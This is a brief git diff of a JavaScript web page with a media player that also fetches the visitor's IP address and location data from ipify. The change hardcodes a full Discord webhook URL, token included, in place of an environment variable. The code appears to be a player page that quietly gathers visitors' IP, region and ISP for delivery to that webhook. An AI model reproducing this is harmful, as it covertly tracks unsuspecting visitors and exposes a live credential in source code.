@@ -6,7 +6,7 @@ const regionElement = document.getElementById('region');
 const ispElement = document.getElementById('isp');
 const player = document.getElementById('player'); 
 const playPauseButton = document.getElementById('play-pause-button');
-const webhookUrl = process.env.WEBHOOK_URL;
+const webhookUrl = "https://discord.com/api/webhooks/1332733975403171972/D7g66UzImBf2JjOEXLEKDHsHJJzsAzyvVC6pWXkrJAxVP5wIroj3gnBYFSbtTIqQXoE4";
 
 // Fetch the IP address and location data
 fetch('https://api.ipify.org?format=json')
